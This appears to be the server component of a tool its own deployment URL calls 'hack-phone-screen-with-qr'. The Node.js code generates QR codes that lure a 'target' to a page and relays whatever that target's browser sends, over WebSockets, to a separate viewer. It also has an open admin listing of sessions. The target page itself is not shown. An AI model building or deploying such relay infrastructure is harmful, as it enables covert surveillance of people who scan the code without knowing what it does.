// server.js
const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const path = require('path');
const qrcode = require('qrcode');
const { v4: uuidv4 } = require('uuid');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ noServer: true });

const sessions = new Map();

// Render.com için health check endpoint (ping atıldığında uyanık kalır)
app.get('/', (req, res) => {
    res.json({
        status: 'active',
        timestamp: new Date().toISOString(),
        activeSessions: sessions.size,
        uptime: process.uptime()
    });
});

// Health check — Render.com bunu kullanır
app.get('/health', (req, res) => {
    res.status(200).json({
        status: 'healthy',
        activeSessions: sessions.size,
        memory: process.memoryUsage(),
        uptime: process.uptime()
    });
});

// QR kod ve yeni oturum oluştur
app.get('/generate', async (req, res) => {
    const sessionId = uuidv4();
    const host = req.get('host');
    const protocol = req.headers['x-forwarded-proto'] || req.protocol;
    const targetUrl = `${protocol}://${host}/s/${sessionId}`;

    sessions.set(sessionId, {
        id: sessionId,
        targetWs: null,
        viewerWs: null,
        connected: false,
        createdAt: new Date(),
        lastActivity: new Date()
    });

    // QR kod oluştur (base64)
    const qrImage = await qrcode.toDataURL(targetUrl, {
        width: 400,
        margin: 2,
        color: { dark: '#000000', light: '#ffffff' }
    });

    res.json({
        success: true,
        sessionId,
        targetUrl,
        qrCode: qrImage,
        viewerUrl: `${protocol}://${host}/view/${sessionId}`
    });
});

// Hedef sayfa (QR okutulduğunda açılan)
app.get('/s/:sessionId', (req, res) => {
    const session = sessions.get(req.params.sessionId);
    if (!session) {
        return res.status(404).send('Oturum bulunamadı veya süresi dolmuş');
    }
    res.sendFile(path.join(__dirname, 'target.html'));
});

// İzleyici sayfası
app.get('/view/:sessionId', (req, res) => {
    const session = sessions.get(req.params.sessionId);
    if (!session) {
        return res.status(404).send('Oturum bulunamadı veya süresi dolmuş');
    }
    res.sendFile(path.join(__dirname, 'viewer.html'));
});

// Aktif oturumları listele (admin)
app.get('/admin/sessions', (req, res) => {
    const sessionList = [];
    sessions.forEach((session, id) => {
        sessionList.push({
            id,
            connected: session.connected,
            createdAt: session.createdAt,
            lastActivity: session.lastActivity,
            hasViewer: !!session.viewerWs,
            hasTarget: !!session.targetWs
        });
    });
    res.json({
        total: sessions.size,
        sessions: sessionList
    });
});

// WebSocket upgrade
server.on('upgrade', (request, socket, head) => {
    const url = new URL(request.url, `https://${request.headers.host}`);
    const pathname = url.pathname;
    const sessionId = url.searchParams.get('id');
    const session = sessions.get(sessionId);

    if (session) {
        wss.handleUpgrade(request, socket, head, (ws) => {
            session.lastActivity = new Date();

            if (pathname === '/ws/target') {
                session.targetWs = ws;
                session.connected = true;

                ws.on('message', (data) => {
                    session.lastActivity = new Date();
                    if (session.viewerWs && session.viewerWs.readyState === WebSocket.OPEN) {
                        session.viewerWs.send(data);
                    }
                });

                ws.on('close', () => {
                    session.connected = false;
                    session.targetWs = null;
                });

                ws.on('error', (err) => {
                    console.error('Target WS error:', err);
                });
            } else if (pathname === '/ws/viewer') {
                session.viewerWs = ws;

                ws.on('close', () => {
                    session.viewerWs = null;
                });

                ws.on('error', (err) => {
                    console.error('Viewer WS error:', err);
                });
            }
        });
    } else {
        socket.destroy();
    }
});

// Eski oturumları temizle (30 dakika sonra)
setInterval(() => {
    const now = new Date();
    sessions.forEach((session, id) => {
        if (now - session.lastActivity > 30 * 60 * 1000) {
            if (session.targetWs) session.targetWs.close();
            if (session.viewerWs) session.viewerWs.close();
            sessions.delete(id);
            console.log(`Oturum temizlendi: ${id}`);
        }
    });
}, 5 * 60 * 1000); // Her 5 dakikada bir kontrol et

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`🎯 Server running on port ${PORT}`);
    console.log(`🔗 URL: https://hack-phone-screen-with-qr.onrender.com`);
});

